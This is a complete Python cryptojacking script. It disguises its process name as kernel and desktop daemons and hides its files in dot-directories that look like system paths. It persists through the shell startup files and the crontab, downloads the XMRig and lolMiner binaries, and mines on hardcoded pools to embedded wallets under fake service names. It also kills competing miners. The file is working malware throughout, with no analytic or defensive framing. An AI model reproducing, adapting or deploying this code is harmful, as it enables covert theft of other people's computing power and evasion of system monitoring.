#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import shutil
import signal
import socket
import hashlib
import platform
import threading
import subprocess
import random
import re
import tarfile
from urllib.request import urlopen, Request, URLError
from http.client import IncompleteRead
from pathlib import Path
import shlex
import logging
import fcntl  # For file lock
import ctypes # For prctl

# --- SINGLE INSTANCE LOCK ---
# Must be at the very top.
class SingleInstance:
    """
    Ensures that only one instance of the script is running.
    The lock file is placed in the determined WORK_DIR to survive /tmp cleanup.
    """
    def __init__(self, work_dir):
        # The lock file name is now deterministic but still unique to the script's path.
        script_path_hash = hashlib.md5(Path(__file__).resolve().as_posix().encode()).hexdigest()
        self.lock_file_path = work_dir / f".sys_{script_path_hash}.lock"
        self.lock_file = None
        self.locked = False

    def acquire(self):
        try:
            # Open file, creating it if it doesn't exist.
            self.lock_file = self.lock_file_path.open("w")
            # Try to acquire an exclusive, non-blocking lock.
            fcntl.flock(self.lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
            self.locked = True
            return True
        except (IOError, BlockingIOError):
            # Another instance holds the lock.
            if self.lock_file:
                self.lock_file.close()
            return False

    def release(self):
        if self.locked and self.lock_file:
            try:
                fcntl.flock(self.lock_file, fcntl.LOCK_UN)
                self.lock_file.close()
                self.lock_file_path.unlink(missing_ok=True)
            except (IOError, OSError):
                pass # Ignore errors on release.
            finally:
                self.locked = False
                self.lock_file = None

    def __enter__(self):
        if not self.acquire():
            # Exit silently if another instance is running.
            sys.exit(0)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.release()

# --- MASK PROCESS NAME (PRCTL) ---
def mask_process_name(name):
    """
    Attempts to mask the process name using prctl. This is not foolproof.
    Tools reading /proc/pid/cmdline will still see the original command.
    """
    try:
        libc = ctypes.CDLL("libc.so.6")
        PR_SET_NAME = 15
        # Name must be bytes, limited to 16 chars including null terminator.
        name_bytes = name.encode()[:15]
        libc.prctl(PR_SET_NAME, name_bytes)
        # Also attempt to clear argv for older tools. This is mostly cosmetic.
        for i in range(len(sys.argv)):
            sys.argv[i] = " " * len(sys.argv[i])
    except (OSError, AttributeError, FileNotFoundError):
        # Fallback for systems without prctl or ctypes, just mask argv[0].
        sys.argv[0] = name

# Call masking early.
mask_process_name(random.choice(["[kworker/u4:0]", "[dbus-daemon]", "[gsd-color]", "[gvfsd-fuse]"]))

# --- CONFIGURATION ---
class Config:
    HOSTNAME = "".join(filter(str.isalnum, socket.gethostname()))[:24] or "node"

    ARCH_MAP = {"amd64": "x86_64", "AMD64": "x86_64"}
    ARCH = ARCH_MAP.get(platform.machine(), platform.machine())

    XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
    LOLMINER_URL = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

    XMRIG_POOLS = ["fr-zephyr.miningocean.org:5332", "sg-zephyr.miningocean.org:5332", "hk-zephyr.miningocean.org:5332", "us-zephyr.miningocean.org:5332"]
    XMRIG_WALLET = "ZEPHYR2yHqQ1QWL54XVWxvbBkAH7X26n8jGhjAj3sbva4766ze2LpmQW1Z1bd7xRwFh9bkSPsA5qgEsy9bXLtXCVcZTsX8Vputc2S"

    LOLMINER_POOLS = ["xtm-c29.kryptex.network:8040", "xtm-c29-eu.kryptex.network:8040", "xtm-c29-us.kryptex.network:8040"]
    LOLMINER_WALLET_BASE = "1238rkM7gGg3KaNU4PdLyqHATf2qXhVE76PiYeUVCZ5Rar7VeckmcEYxW69k7kFAcR157Q4gYozAfBFYyQcVrpJacgr"
    LOLMINER_WALLET = f"{LOLMINER_WALLET_BASE}/{HOSTNAME}"
    
    # More robust and less volatile WORK_DIR candidates.
    WORK_DIR_CANDIDATES = [
        Path.home() / ".config" / ".systemd-user",
        Path.home() / ".local" / "share" / ".services",
        Path("/dev/shm") / f".X11-unix-{os.getuid()}",
        Path("/tmp") / f".font-unix-{os.getuid()}"
    ]
    WORK_DIR = None

    @staticmethod
    def _is_writable_and_executable(path):
        """Checks if a directory is writable and executable."""
        try:
            path.mkdir(mode=0o700, parents=True, exist_ok=True)
            test_file = path / f".test_{random.randint(1000, 9999)}"
            # Write test
            test_file.touch(mode=0o700)
            # Executable test
            if "noexec" in os.popen(f"mount | grep ' on {shlex.quote(str(path))}'").read():
                test_file.unlink()
                return False
            test_file.unlink()
            return True
        except (IOError, OSError):
            return False

    @classmethod
    def setup_work_dir(cls):
        for candidate in cls.WORK_DIR_CANDIDATES:
            if cls._is_writable_and_executable(candidate):
                cls.WORK_DIR = candidate.resolve()
                return
        # Final fallback to home directory if all else fails.
        cls.WORK_DIR = Path.home() / ".local" / ".sys"
        cls.WORK_DIR.mkdir(mode=0o700, parents=True, exist_ok=True)

    USER_AGENT = f"Mozilla/5.{random.randint(0,9)} (X11; Linux {ARCH}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"

# Initialize configuration
Config.setup_work_dir()

# --- LOGGING (thread-safe by default) ---
# Create a dedicated logger to avoid conflicts with other modules.
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
ICONS = {"INFO": "⚙️", "ERROR": "🔥", "WARNING": "⚠️", "SUCCESS": "✅"}

def log(level, msg):
    icon = ICONS.get(level.upper(), "⚡")
    # Use our dedicated logger instance
    logger.log(getattr(logging, level.upper()), f"{icon} {msg}")

# --- UTILITIES ---
class Utils:
    @staticmethod
    def download(url, dest_path):
        try:
            req = Request(url, headers={'User-Agent': Config.USER_AGENT})
            with urlopen(req, timeout=120) as response:
                # CRITICAL FIX: Check HTTP status code before downloading.
                if response.status != 200:
                    log("ERROR", f"Download failed for {url} with status {response.status}")
                    return False
                with open(dest_path, 'wb') as f:
                    shutil.copyfileobj(response, f)
            return True
        except (URLError, IncompleteRead, socket.timeout, Exception) as e:
            log("ERROR", f"Download failed for {url}: {e}")
            dest_path.unlink(missing_ok=True)
            return False

    @staticmethod
    def extract_tar_gz(tar_path, extract_to):
        """
        Securely extract a tar.gz file, preventing path traversal attacks.
        """
        try:
            with tarfile.open(tar_path, "r:gz") as tar:
                # CRITICAL FIX: Verify all paths before extraction.
                extract_to_abs = extract_to.resolve()
                for member in tar.getmembers():
                    member_path = (extract_to_abs / member.name).resolve()
                    if not str(member_path).startswith(str(extract_to_abs)):
                        log("ERROR", f"Path traversal attempt in {tar_path.name}: '{member.name}' is malicious.")
                        return False
                # If all paths are safe, proceed with extraction.
                tar.extractall(path=extract_to)
            return True
        except (tarfile.TarError, EOFError, Exception) as e:
            log("ERROR", f"Extraction failed for {tar_path.name}: {e}")
            return False

    @staticmethod
    def find_binary(search_path, binary_name):
        try:
            # Use rglob but verify that the result is a file.
            matches = [p for p in Path(search_path).rglob(binary_name) if p.is_file()]
            return matches[0] if matches else None
        except Exception as e:
            log("ERROR", f"Error finding binary {binary_name}: {e}")
        return None

    @staticmethod
    def get_cpu_threads():
        try:
            return len(os.sched_getaffinity(0))
        except (AttributeError, OSError):
            return os.cpu_count() or 1

    @staticmethod
    def has_gpu():
        if shutil.which("nvidia-smi"): return True
        if shutil.which("rocm-smi"): return True
        # Check for existence of the /dev/dri directory first.
        dri_path = Path("/dev/dri")
        if dri_path.exists() and dri_path.is_dir():
            return any(dri_path.glob("renderD*"))
        return False

class ProcessManager:
    @staticmethod
    def kill_rivals(managed_pids):
        # More specific regex to reduce false positives.
        rivals = [r"xmrig", r"lolminer", r"nanominer", r"gminer", r"t-rex", r"cpuminer"]
        rival_regex = re.compile(r"\b(" + "|".join(rivals) + r")\b", re.IGNORECASE)
        current_uid = os.getuid()

        if not Path("/proc").is_dir(): return

        for pid_dir in Path("/proc").glob("[0-9]*"):
            try:
                pid = int(pid_dir.name)
                # Never touch init, and skip self and managed children.
                if pid <= 1 or pid == os.getpid() or pid in managed_pids:
                    continue

                # Check ownership first to avoid unnecessary file reads.
                if pid_dir.stat().st_uid != current_uid:
                    continue

                with (pid_dir / "cmdline").open("rb") as f:
                    cmdline = f.read().replace(b'\x00', b' ').decode(errors='ignore')
                if not cmdline: continue

                if rival_regex.search(cmdline):
                    log("WARNING", f"Found rival process {pid} ('{cmdline[:50]}...'). Terminating.")
                    # Try graceful termination first, then kill.
                    try:
                        os.kill(pid, signal.SIGTERM)
                        time.sleep(2) # Give it time to shut down.
                        os.kill(pid, signal.SIGKILL) # Force kill if still alive.
                    except ProcessLookupError:
                        pass # Already gone.
            except (ProcessLookupError, FileNotFoundError, PermissionError, ValueError):
                continue

class Persistence:
    @staticmethod
    def apply():
        # Using a more unique identifier for pgrep checks.
        unique_id = hashlib.md5(str(Config.WORK_DIR).encode()).hexdigest()[:12]
        script_path = Path(__file__).resolve()
        # Embed the unique ID as a fake argument for reliable pgrep.
        launch_cmd = f'("{sys.executable}" "{script_path}" --id={unique_id} &)'
        
        Persistence._apply_shell(launch_cmd, unique_id)
        Persistence._apply_cron(launch_cmd, unique_id)

    @staticmethod
    def _apply_shell(launch_cmd, unique_id):
        marker = f"# SYS-INIT-{unique_id[:8]}"
        for shell_rc in [".bashrc", ".profile", ".zshrc"]:
            rc_path = Path.home() / shell_rc
            if not rc_path.is_file(): continue
            try:
                content = rc_path.read_text()
                if marker not in content:
                    with rc_path.open("a") as f:
                        f.write(f"\n{marker}\nif ! pgrep -f '--id={unique_id}'; then {launch_cmd}; fi\n")
                    log("INFO", f"Added persistence to {rc_path.name}")
            except Exception as e:
                log("ERROR", f"Failed to write to {rc_path.name}: {e}")

    @staticmethod
    def _apply_cron(launch_cmd, unique_id):
        marker = f"# SYS-WATCHDOG-{unique_id[:8]}"
        try:
            # FIX: Handle empty crontab which causes CalledProcessError.
            proc = subprocess.run(["crontab", "-l"], capture_output=True, text=True, errors="ignore")
            current_cron = proc.stdout if proc.returncode == 0 else ""
            
            if marker not in current_cron:
                new_cron = current_cron.strip() + f"\n{marker}\n@reboot {launch_cmd}\n"
                subprocess.run(["crontab", "-"], input=new_cron, text=True, check=True, capture_output=True)
                log("INFO", "Added persistence to user crontab.")
        except (subprocess.CalledProcessError, FileNotFoundError):
            pass # Cron not available or fails, silently ignore.

class MinerManager:
    def __init__(self, name, binary_path, args_template, pools, wallet, needs_gpu=False):
        self.name = name
        self.binary_path = Path(binary_path) if binary_path else None
        self.args_template = args_template
        self.pools = pools
        self.wallet = wallet
        self.needs_gpu = needs_gpu
        self.process = None
        self.lock = threading.Lock()
        self.permanently_disabled = False

    def is_ready(self):
        return self.binary_path and self.binary_path.exists() and os.access(self.binary_path, os.X_OK)

    def is_alive(self):
        with self.lock:
            return self.process and self.process.poll() is None

    def test_pool(self, pool):
        try:
            host, port_str = pool.split(':')
            # Lower timeout to avoid long blocking delays.
            with socket.create_connection((host, int(port_str)), timeout=5):
                return True
        except (socket.timeout, socket.error, ValueError, OSError):
            return False

    def find_working_pool(self):
        shuffled_pools = self.pools.copy()
        random.shuffle(shuffled_pools)
        for pool in shuffled_pools:
            if self.test_pool(pool):
                log("SUCCESS", f"Found working pool for {self.name}: {pool}")
                return pool
        return None

    def start(self):
        with self.lock:
            if self.is_alive() or self.permanently_disabled:
                return

            if not self.is_ready():
                log("ERROR", f"{self.name} binary not ready.")
                self.permanently_disabled = True # Disable if binary is missing.
                return

            if self.needs_gpu and not Utils.has_gpu():
                log("WARNING", f"No compatible GPU detected for {self.name}. Disabling.")
                self.permanently_disabled = True
                return

            pool = self.find_working_pool()
            if not pool:
                log("ERROR", f"No working pools found for {self.name}. Will retry later.")
                return

            # More robust CPU throttling logic.
            cpu_threads = Utils.get_cpu_threads()
            threads = max(1, int(cpu_threads * 0.8)) if cpu_threads > 1 else 1

            args = self.args_template.format(
                binary=shlex.quote(str(self.binary_path)), pool=pool, wallet=self.wallet,
                name=Config.HOSTNAME, threads=threads
            )
            
            try:
                # Using os.setsid in preexec_fn is risky in threads, but necessary to detach.
                # The risk is minimized by the lock, but not eliminated.
                self.process = subprocess.Popen(
                    shlex.split(args), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL, preexec_fn=os.setsid, close_fds=True
                )
                log("SUCCESS", f"Started {self.name} (PID: {self.process.pid}) with {threads} threads.")
                return self.process.pid
            except Exception as e:
                log("ERROR", f"Failed to start {self.name}: {e}")
                self.process = None

def ensure_miner(name, url, binary_name_in_archive):
    miner_dir = Config.WORK_DIR / name
    binary_path = miner_dir / binary_name_in_archive

    if binary_path.exists() and os.access(binary_path, os.X_OK):
        return binary_path

    log("INFO", f"Ensuring {name} miner...")
    tar_path = Config.WORK_DIR / f"{name}.tgz"

    if not Utils.download(url, tar_path): return None

    temp_extract_dir = Config.WORK_DIR / f".extract_{name}_{random.randint(1000,9999)}"
    if not Utils.extract_tar_gz(tar_path, temp_extract_dir):
        shutil.rmtree(temp_extract_dir, ignore_errors=True)
        tar_path.unlink(missing_ok=True)
        return None
    
    tar_path.unlink(missing_ok=True)

    extracted_binary = Utils.find_binary(temp_extract_dir, binary_name_in_archive)
    if not extracted_binary:
        log("ERROR", f"Could not find '{binary_name_in_archive}' in extracted files.")
        shutil.rmtree(temp_extract_dir, ignore_errors=True)
        return None

    # FIX: More robustly move contents from the extracted top-level directory.
    # Most archives have a single directory inside.
    source_items = list(temp_extract_dir.iterdir())
    source_dir = temp_extract_dir
    if len(source_items) == 1 and source_items[0].is_dir():
        source_dir = source_items[0]

    shutil.rmtree(miner_dir, ignore_errors=True)
    miner_dir.mkdir(mode=0o700, exist_ok=True)

    for item in source_dir.iterdir():
        try:
            shutil.move(str(item), str(miner_dir / item.name))
        except OSError:
            pass # Ignore errors on move (e.g. busy files)

    shutil.rmtree(temp_extract_dir, ignore_errors=True)

    if binary_path.exists():
        binary_path.chmod(0o755)
        log("SUCCESS", f"{name} is ready at {binary_path}.")
        return binary_path
    
    log("ERROR", f"{name} setup failed, final binary not found at expected path.")
    return None

def main():
    log("INFO", f"Service initializing. Work dir: {Config.WORK_DIR}")
    Persistence.apply()

    xmrig_bin = ensure_miner("xmrig", Config.XMRIG_URL, "xmrig")
    # lolMiner binary name can vary by version, being more generic.
    lolminer_bin = ensure_miner("lolminer", Config.LOLMINER_URL, "lolMiner")

    managers = []
    if xmrig_bin:
        managers.append(MinerManager(
            name="systemd-resolver", binary_path=xmrig_bin,
            args_template='{binary} -o {pool} -u {wallet} -p {name} -a rx/0 -k --cpu-max-threads-hint {threads} --donate-level 1 --no-color --randomx-1gb-pages',
            pools=Config.XMRIG_POOLS, wallet=Config.XMRIG_WALLET
        ))
    if lolminer_bin:
        managers.append(MinerManager(
            name="gvfsd-network", binary_path=lolminer_bin,
            args_template='{binary} --algo CR29 --pool {pool} --user {wallet} --tls on --no-color --apiport 0',
            pools=Config.LOLMINER_POOLS, wallet=Config.LOLMINER_WALLET, needs_gpu=True
        ))

    if not managers:
        log("ERROR", "No miners could be initialized. Exiting.")
        return

    managed_pids = set()

    while True:
        try:
            current_pids = set()
            for mgr in managers:
                if not mgr.is_alive():
                    if mgr.permanently_disabled:
                        continue
                    log("WARNING", f"{mgr.name} is not running. Attempting to start.")
                    new_pid = mgr.start()
                    if new_pid: current_pids.add(new_pid)
                elif mgr.process:
                    current_pids.add(mgr.process.pid)
            
            managed_pids = current_pids
            ProcessManager.kill_rivals(managed_pids)
            
        except Exception as e:
            log("ERROR", f"Error in main loop: {e}")
        
        # Use a longer, more random sleep to be less predictable.
        time.sleep(random.randint(60, 120))

if __name__ == "__main__":
    with SingleInstance(Config.WORK_DIR):
        try:
            main()
        except KeyboardInterrupt:
            log("INFO", "Service stopped by user.")
        except Exception as e:
            # Log critical unhandled errors with more detail.
            import traceback
            log("ERROR", f"Unhandled critical error: {e}\n{traceback.format_exc()}")
